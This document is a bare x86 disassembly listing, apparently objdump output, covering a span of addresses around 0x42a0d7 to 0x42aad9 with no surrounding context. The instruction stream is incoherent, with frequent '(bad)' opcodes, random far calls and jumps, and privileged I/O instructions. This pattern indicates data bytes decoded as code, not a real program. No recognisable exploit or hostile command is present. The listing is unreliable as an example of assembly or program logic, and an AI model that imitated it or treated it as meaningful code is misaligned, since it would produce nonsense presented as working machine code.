  42a0d7:	push   es
  42a0d8:	add    DWORD PTR [esi-0x40],edx
  42a0db:	imul   esi,esi,0xffffffab
  42a0de:	dec    esp
  42a0df:	mov    ecx,0x3b98c660
  42a0e4:	fimul  WORD PTR [ecx-0x77]
  42a0e7:	adc    al,0xc6
  42a0e9:	out    dx,eax
  42a0ea:	in     al,dx
  42a0eb:	test   al,0x1e
  42a0ed:	xchg   ebx,eax
	...
  42a156:	xlat   BYTE PTR ds:[ebx]
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	dec    ebx
  42a163:	pusha  
  42a164:	pop    edi
  42a165:	aas    
  42a166:	addr16 ret 
  42a168:	add    DWORD PTR [eax],eax
  42a16a:	add    BYTE PTR [ecx],al
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	mov    edi,0x35d3dd1d
  42a173:	pop    esi
  42a174:	ret    0x4e89
  42a177:	mov    ch,0x58
  42a179:	jp     0x42a148
  42a17b:	lods   al,BYTE PTR ds:[esi]
  42a17c:	add    al,0x3c
  42a17e:	les    esp,FWORD PTR [ecx]
  42a180:	jb     0x42a139
  42a182:	dec    edi
  42a183:	xchg   ecx,eax
  42a184:	xchg   esp,eax
  42a185:	sbb    dh,BYTE PTR [ebx]
  42a187:	sti    
  42a188:	jne    0x42a196
  42a18a:	jne    0x42a115
  42a18c:	xchg   BYTE PTR [eax+0x9647ed3],bh
  42a192:	cmp    BYTE PTR [ebp-0x2f0d5e3f],0xf6
  42a199:	pop    ss
  42a19a:	sbb    ch,dh
  42a19c:	ins    BYTE PTR es:[edi],dx
  42a19d:	sbb    eax,DWORD PTR [edx+ebp*4-0x7a]
  42a1a1:	sub    DWORD PTR [edi],ecx
  42a1a3:	out    dx,eax
  42a1a4:	mov    ss,WORD PTR [edx-0x4f]
  42a1a7:	leave  
  42a1a8:	mov    esp,DWORD PTR [edx]
  42a1aa:	dec    ebx
  42a1ab:	popa   
  42a1ac:	xchg   BYTE PTR [ecx],cl
  42a1ae:	ficom  DWORD PTR [edi-0xd]
  42a1b1:	fld    TBYTE PTR [edi-0x8]
  42a1b4:	pop    ebx
  42a1b5:	add    al,0x51
  42a1b7:	sbb    eax,0xe18104c
  42a1bc:	pop    ds
  42a1bd:	or     eax,0x998beb05
  42a1c2:	mov    al,0x44
  42a1c4:	out    0x7c,al
  42a1c6:	jo     0x42a21e
  42a1c8:	test   DWORD PTR [eax],ebp
  42a1ca:	popa   
  42a1cb:	pop    ebp
  42a1cc:	dec    eax
  42a1cd:	mov    dl,0xe6
  42a1cf:	dec    edi
  42a1d0:	inc    edi
  42a1d1:	stos   DWORD PTR es:[edi],eax
  42a1d2:	mov    WORD PTR [ebp-0x55c58ad5],?
  42a1d8:	push   0xc851798d
  42a1dd:	call   0xfdc1:0x19e9d4a2
  42a1e4:	adc    eax,0x91156e2e
  42a1e9:	jle    0x42a1e1
  42a1eb:	fsubr  QWORD PTR [ecx+0x37]
  42a1ee:	je     0x42a1a4
  42a1f0:	sbb    eax,0xbbc81758
  42a1f5:	cmp    eax,0x250dc884
  42a1fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1fb:	jo     0x42a1ee
  42a1fd:	sti    
  42a1fe:	fild   DWORD PTR [eax+0x69]
  42a201:	(bad)  
  42a202:	or     al,0x63
  42a204:	inc    eax
  42a205:	inc    ecx
  42a206:	leave  
  42a207:	gs sub al,0x73
  42a20a:	lods   eax,DWORD PTR ds:[esi]
  42a20b:	adc    DWORD PTR [esi],0xffffffac
  42a20e:	cmp    cl,dh
  42a210:	into   
  42a211:	and    ah,BYTE PTR [ebp+esi*2+0xc1d8490]
  42a218:	sahf   
  42a219:	je     0x42a217
  42a21b:	scas   eax,DWORD PTR es:[edi]
  42a21c:	or     dl,BYTE PTR [edx-0x48]
  42a21f:	das    
  42a220:	xchg   ebx,eax
  42a221:	pop    ebx
  42a222:	pop    edi
  42a223:	call   0x7a44:0x76131a05
  42a22a:	icebp  
  42a22b:	mov    dl,0x21
  42a22d:	bound  ebp,QWORD PTR [edi-0x6c]
  42a230:	stos   DWORD PTR es:[edi],eax
  42a231:	icebp  
  42a232:	scas   al,BYTE PTR es:[edi]
  42a233:	sahf   
  42a234:	stc    
  42a235:	ds jle 0x42a1bc
  42a238:	add    esi,DWORD PTR [ebx+eax*4]
  42a23b:	(bad)  
  42a23c:	mov    ecx,0xaaa07a14
  42a241:	mov    ebx,0xa75bfac6
  42a246:	push   ss
  42a247:	sbb    al,0x8b
  42a249:	pop    ss
  42a24a:	in     eax,dx
  42a24b:	and    al,0xf8
  42a24d:	or     esp,DWORD PTR [eax]
  42a24f:	mov    gs,WORD PTR [eax-0x2c]
  42a252:	cmp    bl,BYTE PTR [ecx-0x2d]
  42a255:	dec    esp
  42a256:	mov    dh,0x29
  42a258:	sahf   
  42a259:	fcom   QWORD PTR [edi+0x70799bf7]
  42a25f:	mov    ebx,0x71c2163a
  42a264:	cmp    ecx,DWORD PTR [ecx-0x2bbd76bb]
  42a26a:	fst    DWORD PTR [esi-0x7]
  42a26d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  42a2d6:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a2dc:	scas   eax,DWORD PTR es:[edi]
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	(bad)  [ebx]
  42a2e3:	cmp    ah,ah
  42a2e5:	das    
  42a2e6:	les    eax,FWORD PTR [bx+di]
  42a2e9:	add    BYTE PTR [eax],al
  42a2eb:	add    DWORD PTR [eax],eax
  42a2ed:	add    BYTE PTR [edi],bh
  42a2ef:	std    
  42a2f0:	inc    esp
  42a2f1:	arpl   sp,sp
  42a2f3:	fcmovbe st,st(4)
  42a2f5:	mov    esp,DWORD PTR [eax+0x1ea756b2]
  42a2fb:	leave  
  42a2fc:	sub    esi,DWORD PTR [ebp+ebp*2-0x73]
  42a300:	add    BYTE PTR [edx-0x1cfe81ea],0xfd
  42a307:	cli    
  42a308:	dec    ecx
  42a309:	push   cs
  42a30a:	xchg   ecx,eax
  42a30b:	pop    ecx
  42a30c:	mov    DWORD PTR [edi+0xe],ecx
  42a30f:	inc    ebx
  42a310:	test   al,0xf
  42a312:	in     eax,0x4d
  42a314:	inc    ebx
  42a315:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a316:	xchg   edi,eax
  42a317:	aam    0x30
  42a319:	cmc    
  42a31a:	adc    bh,BYTE PTR [esi-0x42fb5de6]
  42a320:	cmc    
  42a321:	add    DWORD PTR [edi+ecx*1+0x3306fadc],ebp
  42a328:	and    DWORD PTR [edi-0xe],eax
  42a32b:	test   eax,0x3896ff1
  42a330:	icebp  
  42a331:	ja     0x42a39a
  42a333:	cdq    
  42a334:	pushf  
  42a335:	ds jmp 0x42a38d
  42a338:	inc    eax
  42a339:	pop    ebx
  42a33a:	das    
  42a33b:	add    bh,ch
  42a33d:	ins    BYTE PTR es:[edi],dx
  42a33e:	adc    DWORD PTR [ecx+edx*8-0x48],0xc804e0f
  42a346:	mov    BYTE PTR [ecx],0x43
  42a349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a34a:	data16 sub BYTE PTR [ecx],cl
  42a34d:	test   DWORD PTR [eax-0x7b2f71b8],ebx
  42a353:	cmp    esp,DWORD PTR [ebp-0x63]
  42a356:	cdq    
  42a357:	adc    DWORD PTR [edx],eax
  42a359:	test   BYTE PTR [esi-0x556a1e5c],dh
  42a35f:	push   esp
  42a360:	xor    dh,BYTE PTR [esi]
  42a362:	arpl   WORD PTR [esi+0x5a],bp
  42a365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a366:	cwde   
  42a367:	sub    eax,0xd6f650a4
  42a36c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a36d:	cmp    ah,BYTE PTR [edi-0x507d11a4]
  42a373:	ins    BYTE PTR es:[edi],dx
  42a374:	adc    BYTE PTR [ebx+0x6a],ah
  42a377:	call   0x64ab2c40
  42a37c:	jns    0x42a38b
  42a37e:	punpckhwd mm1,QWORD PTR [ebx-0x5f]
  42a382:	jae    0x42a30c
  42a384:	xor    eax,0x74b24e68
  42a389:	adc    DWORD PTR [edx],ebx
  42a38b:	call   0xaef6f5a
  42a390:	das    
  42a391:	push   ss
  42a392:	shr    DWORD PTR [ecx+0x6af9d1fd],1
  42a398:	sysenter 
  42a39a:	jecxz  0x42a365
  42a39c:	lds    eax,FWORD PTR [ebp+0x349e4419]
  42a3a2:	xchg   ecx,eax
  42a3a3:	sub    ecx,DWORD PTR ds:0x76c78819
  42a3a9:	cmp    edi,DWORD PTR [eax]
  42a3ab:	(bad)  
  42a3ac:	aad    0x7b
  42a3ae:	or     al,0xda
  42a3b0:	in     eax,0xcd
  42a3b2:	rcl    eax,0x7f
  42a3b5:	mov    WORD PTR [edx+edx*2+0x15],cs
  42a3b9:	push   es
  42a3ba:	cmp    esi,DWORD PTR [edx-0x34]
  42a3bd:	lds    edx,FWORD PTR [edi-0x26965709]
  42a3c3:	push   es
  42a3c4:	dec    ebx
  42a3c5:	jno    0x42a3b7
  42a3c7:	addr16 dec esi
  42a3c9:	and    eax,0x6db0e8f4
  42a3ce:	shl    DWORD PTR [edi+0x24],0x71
  42a3d2:	push   edx
  42a3d3:	sub    DWORD PTR [ebx+0x6c],esp
  42a3d6:	or     cl,ch
  42a3d8:	repz sbb DWORD PTR [edx-0x42],ebx
  42a3dc:	dec    esp
  42a3dd:	xchg   ebx,eax
  42a3de:	jmp    0xf58:0xcc863a0c
  42a3e5:	(bad)  
  42a3e6:	mov    dl,0x6e
  42a3e8:	int3   
  42a3e9:	mov    ch,0xc
  42a3eb:	pop    ds
  42a3ec:	xor    cl,ah
	...
  42a456:	jg     0x42a466
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0xcb42433d
  42a465:	push   0x1c567
  42a46a:	add    BYTE PTR [ecx],al
  42a46c:	add    BYTE PTR [eax],al
  42a46e:	ftst   
  42a470:	sahf   
  42a471:	mov    ebx,0xa78d34ec
  42a476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a477:	addr16 and bl,dh
  42a47a:	adc    edx,DWORD PTR [esi+0x6a]
  42a47d:	dec    esi
  42a47e:	out    0x1c,eax
  42a480:	(bad)
  42a484:	push   ebp
  42a485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a486:	push   edx
  42a487:	jbe    0x42a4a3
  42a489:	aaa    
  42a48a:	mov    ebp,0x330e9d4d
  42a48f:	dec    esp
  42a490:	jns    0x42a4d9
  42a492:	aam    0x6a
  42a494:	repnz and al,0x85
  42a497:	and    ebp,ebp
  42a499:	mov    eax,DWORD PTR [esi+0x675193b0]
  42a49f:	or     cl,BYTE PTR [edi]
  42a4a1:	sbb    ebx,ecx
  42a4a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a4a4:	ret    0x6ddb
  42a4a7:	fwait
  42a4a8:	shl    dl,cl
  42a4aa:	scas   eax,DWORD PTR es:[edi]
  42a4ab:	jb     0x42a518
  42a4ad:	clc    
  42a4ae:	xchg   bh,dh
  42a4b0:	inc    edi
  42a4b1:	dec    esi
  42a4b2:	or     dh,bl
  42a4b4:	pop    esp
  42a4b5:	cmp    edi,edx
  42a4b7:	adc    al,0x54
  42a4b9:	push   eax
  42a4ba:	mov    es:0x197f39a5,al
  42a4c0:	xchg   ecx,eax
  42a4c1:	xor    ch,0xbd
  42a4c4:	popf   
  42a4c5:	in     al,dx
  42a4c6:	std    
  42a4c7:	mov    ecx,0xac4c6e24
  42a4cc:	xor    al,0x46
  42a4ce:	jae    0x42a497
  42a4d0:	dec    esp
  42a4d1:	lods   al,BYTE PTR ds:[esi]
  42a4d2:	scas   eax,DWORD PTR es:[edi]
  42a4d3:	imul   esp,DWORD PTR [ebp+0x3e],0x56947d1f
  42a4da:	adc    esi,DWORD PTR [edi+0xd]
  42a4dd:	xor    eax,0x2cee2148
  42a4e2:	les    edi,FWORD PTR [eax-0x2d9ca4c3]
  42a4e8:	fist   DWORD PTR [esp+ecx*2]
  42a4eb:	inc    ebp
  42a4ec:	pushf  
  42a4ed:	push   ebx
  42a4ee:	iret   
  42a4ef:	and    BYTE PTR [ecx],bl
  42a4f1:	in     eax,dx
  42a4f2:	dec    ebp
  42a4f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4f4:	movsx  esi,BYTE PTR [edx]
  42a4f7:	mov    edx,0xc12507ba
  42a4fc:	(bad)  
  42a4fd:	or     BYTE PTR [edx-0x50b6e22],al
  42a503:	int3   
  42a504:	ret    
  42a505:	cmp    BYTE PTR [edx-0x70d345b1],al
  42a50b:	add    dl,bl
  42a50d:	rcr    ch,cl
  42a50f:	sub    DWORD PTR [eax+0x10],esp
  42a512:	pop    ss
  42a513:	dec    esi
  42a514:	mov    bl,0xee
  42a516:	mov    edx,0x7fcd0d43
  42a51b:	jecxz  0x42a594
  42a51d:	in     eax,dx
  42a51e:	mov    dh,0xe8
  42a520:	fadd   QWORD PTR [ecx+esi*4]
  42a523:	mov    BYTE PTR es:[esi],0xbf
  42a527:	mov    bh,0x59
  42a529:	adc    DWORD PTR ds:0x998ed4f6,ecx
  42a52f:	xor    DWORD PTR [edi+0x6da727de],edx
  42a535:	in     eax,dx
  42a536:	mov    DWORD PTR [ecx*4+0x25ab9ea7],edi
  42a53d:	pusha  
  42a53e:	lahf   
  42a53f:	lea    ecx,[edx-0x434d87d3]
  42a545:	out    dx,eax
  42a546:	cmp    eax,0xb29e3018
  42a54b:	xchg   ebx,ecx
  42a54d:	mov    WORD PTR [ebx+esi*4],fs
  42a550:	ror    BYTE PTR [esi+0x5e7f75c7],1
  42a556:	shr    bl,cl
  42a558:	jmp    0x56e9:0xdb3aed15
  42a55f:	pusha  
  42a560:	ret    
  42a561:	(bad)  
  42a562:	out    0x60,al
  42a564:	sub    DWORD PTR [ebx],esi
  42a566:	rol    dh,1
  42a568:	cli    
  42a569:	arpl   bx,ax
  42a56b:	adc    BYTE PTR [edx+ebx*8],ah
	...
  42a5d6:	sbb    BYTE PTR [edi+0x17],cl
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0x34d7519f
  42a5e5:	outs   dx,DWORD PTR ds:[esi]
  42a5e6:	mov    BYTE PTR [bx+di],0x0
  42a5ea:	add    BYTE PTR [ecx],al
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	inc    esp
  42a5ef:	push   eax
  42a5f0:	mov    ebx,0x9af38007
  42a5f5:	sub    ah,BYTE PTR [esi-0x283cb2de]
  42a5fb:	adc    cl,BYTE PTR [ebp+0x5c]
  42a5fe:	adc    al,0x33
  42a600:	(bad)  
  42a601:	or     DWORD PTR [edi],edi
  42a603:	not    cl
  42a605:	add    BYTE PTR [edi+0x8],bl
  42a608:	xchg   esi,eax
  42a609:	lods   al,BYTE PTR ds:[esi]
  42a60a:	adc    al,0x1b
  42a60c:	ss ror DWORD PTR gs:[edi+0x63],0x4f
  42a612:	je     0x42a632
  42a614:	clc    
  42a615:	(bad)  
  42a616:	cmp    dh,al
  42a618:	xchg   BYTE PTR [edx],dh
  42a61a:	xor    eax,0x20b494d1
  42a61f:	inc    ebx
  42a620:	test   ch,0x48
  42a623:	jns    0x42a652
  42a625:	dec    eax
  42a626:	push   ebp
  42a627:	add    edx,DWORD PTR [ebx-0x6f]
  42a62a:	jmp    0x42a65b
  42a62c:	data16 mov es,WORD PTR [bp+si]
  42a630:	fdivr  QWORD PTR [ebx-0x533807c6]
  42a636:	jb     0x42a629
  42a638:	mov    al,ds:0x2eaf902a
  42a63d:	cmp    cl,ch
  42a63f:	jns    0x42a68d
  42a641:	push   edi
  42a642:	jae    0x42a69e
  42a644:	jge    0x42a603
  42a646:	call   0x3cfe:0x5cce8345
  42a64d:	fisub  WORD PTR [ebp-0x6c70bdf1]
  42a653:	out    dx,eax
  42a654:	icebp  
  42a655:	ins    DWORD PTR es:[edi],dx
  42a656:	lds    ax,DWORD PTR [ebx]
  42a659:	scas   al,BYTE PTR es:[edi]
  42a65a:	adc    dl,al
  42a65c:	pop    ebx
  42a65d:	test   BYTE PTR [ebx+0x2af9a52d],bh
  42a663:	test   al,0x4c
  42a665:	shr    ch,0x52
  42a668:	retf   
  42a669:	mov    edx,0x89818e48
  42a66e:	jmp    0xd78d3e56
  42a673:	in     al,0x2c
  42a675:	pop    ebx
  42a676:	pop    edi
  42a677:	mov    bh,BYTE PTR [eax]
  42a679:	test   BYTE PTR [ebx+0x5c],dh
  42a67c:	lods   al,BYTE PTR ds:[esi]
  42a67d:	(bad)
  42a681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a682:	jnp    0x42a6a4
  42a684:	dec    ecx
  42a685:	jle    0x42a622
  42a687:	mov    sp,WORD PTR [edx-0x43]
  42a68b:	daa    
  42a68c:	int3   
  42a68d:	mov    eax,0xd8fc0f85
  42a692:	mov    BYTE PTR [ecx-0x2b],bh
  42a695:	aam    0x5e
  42a697:	xlat   BYTE PTR gs:[ebx]
  42a699:	test   al,0x6c
  42a69b:	xchg   edx,eax
  42a69c:	sbb    DWORD PTR [ebx-0x6f2410dc],eax
  42a6a2:	sbb    ecx,DWORD PTR [edx+0x38c6e147]
  42a6a8:	add    ah,BYTE PTR ds:0x58915ada
  42a6ae:	outs   dx,BYTE PTR ds:[esi]
  42a6af:	inc    ebx
  42a6b0:	(bad)  
  42a6b1:	xor    BYTE PTR [ebp+edx*2-0x58],ch
  42a6b5:	jmp    0x5d9c50db
  42a6ba:	mov    ecx,0xd84be46a
  42a6bf:	add    edi,DWORD PTR [eax+0x8feee14]
  42a6c5:	jle    0x42a688
  42a6c7:	psubq  mm0,QWORD PTR [esi-0xafb0096]
  42a6ce:	int3   
  42a6cf:	ret    0x434a
  42a6d2:	repz or esi,DWORD PTR [ebp-0x524086f0]
  42a6d9:	popf   
  42a6da:	xor    BYTE PTR [edi],ah
  42a6dc:	jge    0x42a6c9
  42a6de:	ja     0x42a6ad
  42a6e0:	std    
  42a6e1:	test   eax,0x654cf137
  42a6e6:	or     ebp,DWORD PTR [edx-0x31]
  42a6e9:	lods   al,BYTE PTR ds:[esi]
  42a6ea:	ds dec edx
  42a6ec:	pop    esi
  42a6ed:	xchg   esi,eax
	...
  42a756:	and    al,0x16
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi-0x6b47ece4],0x6749286b
  42a767:	mov    DWORD PTR [ecx],0x10000
  42a76d:	add    BYTE PTR [edx],dh
  42a76f:	inc    ebp
  42a770:	out    dx,al
  42a771:	(bad)  
  42a772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a773:	push   ss
  42a774:	not    DWORD PTR ds:0xfb7b5b8f
  42a77a:	leave  
  42a77b:	push   es
  42a77c:	int    0xd3
  42a77e:	repz mov eax,0x4ba4e085
  42a784:	xlat   BYTE PTR ds:[ebx]
  42a785:	lods   al,BYTE PTR ds:[esi]
  42a786:	aaa    
  42a787:	daa    
  42a788:	outs   dx,BYTE PTR ds:[esi]
  42a789:	into   
  42a78a:	les    esi,FWORD PTR [edx-0x57]
  42a78d:	rcr    BYTE PTR [edx],cl
  42a78f:	cmp    al,0x3d
  42a791:	sbb    eax,0xb00340f5
  42a796:	mov    ds:0x7982c32f,eax
  42a79b:	add    bh,bl
  42a79d:	pop    esp
  42a79e:	jge    0x42a7c8
  42a7a0:	pop    esp
  42a7a1:	mov    ds:0x43316181,al
  42a7a6:	or     cl,bl
  42a7a8:	std    
  42a7a9:	mov    ecx,0x3b5238e
  42a7ae:	push   ecx
  42a7af:	imul   edi,DWORD PTR [ebx+ebx*1+0x46],0x11fd566f
  42a7b7:	jne    0x42a790
  42a7b9:	ds jp  0x42a76f
  42a7bc:	(bad)
  42a7c0:	adc    al,0xbd
  42a7c2:	or     edi,DWORD PTR [edx-0x33]
  42a7c5:	jp     0x42a82f
  42a7c7:	mov    cl,0xeb
  42a7c9:	sar    DWORD PTR [edx],0x7
  42a7cc:	out    0x1e,eax
  42a7ce:	aas    
  42a7cf:	mov    al,0xe4
  42a7d1:	jmp    0x42a844
  42a7d3:	mov    ebp,ecx
  42a7d5:	mov    eax,ds:0x3f2f4f09
  42a7da:	ins    BYTE PTR es:[edi],dx
  42a7db:	ficomp DWORD PTR [esi+0x54696dee]
  42a7e1:	pop    ds
  42a7e2:	test   BYTE PTR [edi+0x1f],dh
  42a7e5:	push   es
  42a7e6:	retf   
  42a7e7:	add    eax,0x87e61c7e
  42a7ec:	fistp  DWORD PTR [esi+esi*2]
  42a7ef:	push   ds
  42a7f0:	sar    DWORD PTR [edx-0x7b77785f],1
  42a7f6:	imul   esp,DWORD PTR [esi+0x32],0xffffff95
  42a7fa:	in     al,0x7
  42a7fc:	in     al,dx
  42a7fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7fe:	xor    bl,bl
  42a800:	mov    al,cs:0x2baf0898
  42a806:	xchg   edx,eax
  42a807:	push   ebp
  42a808:	les    edx,FWORD PTR [ecx+0x19]
  42a80b:	jno    0x42a7b0
  42a80d:	jle    0x42a795
  42a80f:	lods   al,BYTE PTR ds:[esi]
  42a810:	in     al,0x81
  42a812:	out    dx,eax
  42a813:	pop    ebp
  42a814:	and    esi,0xdd049b24
  42a81a:	shl    BYTE PTR [eax],0x46
  42a81d:	sbb    DWORD PTR [edx+0x52],0xa2cf054a
  42a824:	repz cmp eax,0xd5169e7d
  42a82a:	cmp    BYTE PTR [edx+0x7fdfc417],bl
  42a830:	imul   ecx,DWORD PTR [ebx+eiz*1-0x4],0x4a
  42a835:	jmp    0x42a7c8
  42a837:	hlt    
  42a838:	jl     0x42a7fc
  42a83a:	mov    al,0xdc
  42a83c:	mul    BYTE PTR [edi+ebp*4-0x1e8cb1a8]
  42a843:	fwait
  42a844:	pop    esi
  42a845:	mov    edi,0xa9d5a063
  42a84a:	dec    ebp
  42a84b:	cmp    BYTE PTR [ebx+0x30f8ad53],al
  42a851:	xchg   ecx,ecx
  42a853:	inc    edi
  42a854:	cmp    eax,0xbc8e762b
  42a859:	jnp    0x42a87b
  42a85b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a85c:	fst    DWORD PTR [esi+0x4c]
  42a85f:	mov    esi,0x61edd063
  42a864:	push   ebx
  42a865:	push   ss
  42a866:	add    DWORD PTR [eax+0x16],ebx
  42a869:	inc    esi
  42a86a:	adc    eax,0xdd071c
	...
  42a8d3:	add    BYTE PTR [eax],al
  42a8d5:	add    BYTE PTR [edx-0x10409c9b],cl
  42a8db:	mov    edi,0xc58175de
  42a8e0:	xchg   edi,eax
  42a8e1:	ins    BYTE PTR es:[edi],dx
  42a8e2:	cmp    al,BYTE PTR cs:[esi+0x1c86769]
  42a8e9:	add    BYTE PTR [eax],al
  42a8eb:	add    DWORD PTR [eax],eax
  42a8ed:	add    BYTE PTR [esi+ebp*4],al
  42a8f0:	inc    esi
  42a8f1:	fs daa 
  42a8f3:	repz icebp 
  42a8f5:	sub    eax,0xe739c837
  42a8fa:	pop    esi
  42a8fb:	xor    DWORD PTR [esi+0x425cf591],0xffffffa9
  42a902:	cmp    DWORD PTR [esi],edi
  42a904:	or     ecx,edi
  42a906:	outs   dx,BYTE PTR ds:[esi]
  42a907:	cwde   
  42a908:	lods   eax,DWORD PTR ds:[esi]
  42a909:	out    dx,al
  42a90a:	jle    0x42a8c6
  42a90c:	ds dec ebp
  42a90e:	lahf   
  42a90f:	jg     0x42a8fa
  42a911:	add    eax,0x3e1e24e
  42a916:	in     eax,0x92
  42a918:	jbe    0x42a98a
  42a91a:	popf   
  42a91b:	test   al,0xf5
  42a91d:	mov    ss,WORD PTR [eax+0x4761000e]
  42a923:	or     BYTE PTR [edi+0x110177ee],bl
  42a929:	test   BYTE PTR [ebx+0x5f549f7c],0x3a
  42a930:	cmp    al,0x38
  42a932:	fdiv   QWORD PTR ds:0xc1a77d1d
  42a938:	cmp    al,0x33
  42a93b:	lahf   
  42a93c:	ja     0x42a920
  42a93e:	xchg   ebx,edx
  42a940:	cwde   
  42a941:	es push ebx
  42a943:	dec    esp
  42a944:	fbld   TBYTE PTR [esi-0x3b1b6096]
  42a94a:	or     dl,BYTE PTR [edi-0x15]
  42a94d:	call   0x721c3387
  42a952:	test   al,0xe6
  42a954:	mov    cl,0xe
  42a956:	and    bl,BYTE PTR [ecx-0x44]
  42a959:	add    eax,0x1ac29a16
  42a95e:	mov    eax,ds:0xcf4a3838
  42a963:	gs push 0x2a
  42a966:	adc    al,0x4f
  42a968:	adc    edi,DWORD PTR [esi+eax*8-0x2d]
  42a96c:	cli    
  42a96d:	jecxz  0x42a90f
  42a96f:	push   ds
  42a970:	mov    bh,0x73
  42a972:	out    dx,eax
  42a973:	shl    DWORD PTR [esi],cl
  42a975:	shl    BYTE PTR [ebp+0x47bb53b0],cl
  42a97b:	push   ebp
  42a97c:	pop    ebp
  42a97d:	mov    edi,0x6c7af3d3
  42a982:	(bad)  
  42a983:	xor    DWORD PTR [eax],esp
  42a985:	lea    edx,[esi]
  42a987:	adc    al,BYTE PTR [ebx+0x16]
  42a98a:	xor    eax,0x40e1f978
  42a98f:	mov    eax,0x1469aee1
  42a994:	mov    ah,bl
  42a996:	adc    al,0xe5
  42a998:	push   eax
  42a999:	js     0x42a978
  42a99b:	sub    DWORD PTR [ebp+0x2f],ebx
  42a99e:	shl    DWORD PTR [ebp-0x36],1
  42a9a1:	scas   al,BYTE PTR es:[edi]
  42a9a2:	inc    esp
  42a9a3:	stos   DWORD PTR es:[edi],eax
  42a9a4:	mov    esp,DWORD PTR [edx+0x1c]
  42a9a7:	icebp  
  42a9a8:	dec    edi
  42a9a9:	(bad)  
  42a9aa:	hlt    
  42a9ab:	jne    0x42a992
  42a9ad:	rcl    BYTE PTR [edi+0x1],1
  42a9b0:	mov    WORD PTR [eax],es
  42a9b2:	hlt    
  42a9b3:	je     0x42aa0c
  42a9b5:	repz ss inc bx
  42a9b9:	dec    ecx
  42a9ba:	fstp   QWORD PTR [ecx+0x3c]
  42a9bd:	out    0x38,eax
  42a9bf:	and    al,0x29
  42a9c1:	aas    
  42a9c2:	aas    
  42a9c3:	mov    esi,0x7e7d336a
  42a9c8:	test   eax,0x5bbd129d
  42a9cd:	cdq    
  42a9ce:	mov    ebx,0xc86a0328
  42a9d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a9d4:	mov    dh,0x39
  42a9d6:	mov    eax,ds:0xfaf3d768
  42a9db:	addr16 add al,0xec
  42a9de:	jnp    0x42aa21
  42a9e0:	inc    edx
  42a9e1:	test   DWORD PTR [edi*4+0x364672f],eax
  42a9e8:	pop    esi
  42a9e9:	or     BYTE PTR [eax],dh
  42a9eb:	dec    esp
  42a9ec:	call   DWORD PTR [ebx+0x0]
	...
  42aa53:	add    BYTE PTR [eax],al
  42aa55:	add    BYTE PTR [eax+0x3fee1d93],ch
  42aa5b:	out    dx,al
  42aa5c:	sti    
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	dec    esp
  42aa63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aa64:	pusha  
  42aa65:	and    eax,0x1c967
  42aa6a:	add    BYTE PTR [ecx],al
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	(bad)  [edx-0x6b2b7d9a]
  42aa74:	cwde   
  42aa75:	pop    ss
  42aa76:	iret   
  42aa77:	ficom  WORD PTR [esi-0x7995202c]
  42aa7d:	fisttp DWORD PTR [ebp+ebx*4-0x4a7b8e5f]
  42aa84:	lods   eax,DWORD PTR ds:[esi]
  42aa85:	inc    esi
  42aa86:	not    DWORD PTR [ecx+0x65e4d73c]
  42aa8c:	sub    dl,al
  42aa8e:	pop    esp
  42aa8f:	xchg   ebx,eax
  42aa90:	pop    es
  42aa91:	(bad)  [ebp+ecx*2-0x1185a19a]
  42aa98:	xchg   edi,eax
  42aa99:	mov    bh,BYTE PTR [edi+0x3c7671b4]
  42aa9f:	cmp    cl,dh
  42aaa1:	nop
  42aaa2:	push   esp
  42aaa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aaa4:	jecxz  0x42ab0f
  42aaa6:	sbb    BYTE PTR ds:0xcd917f09,bl
  42aaac:	loop   0x42aae9
  42aaae:	or     DWORD PTR [edi],esp
  42aab0:	mov    al,0x41
  42aab2:	aaa    
  42aab3:	sub    cl,BYTE PTR [ebx-0x27]
  42aab6:	xchg   esi,eax
  42aab7:	ins    DWORD PTR es:[edi],dx
  42aab8:	hlt    
  42aab9:	pop    edx
  42aaba:	lock fs push edi
  42aabd:	xchg   BYTE PTR [ebx],cl
  42aabf:	std    
  42aac0:	test   eax,0x206f195c
  42aac5:	mov    edx,DWORD PTR [ebx]
  42aac7:	loopne 0x42ab47
  42aac9:	adc    al,dh
  42aacb:	inc    ecx
  42aacc:	inc    eax
  42aacd:	out    0x9b,al
  42aacf:	adc    BYTE PTR [esi-0x120d696e],cl
  42aad5:	out    dx,eax
  42aad6:	pop    edx
  42aad7:	jns    0x42aab2
  42aad9:	add    al,0x7b
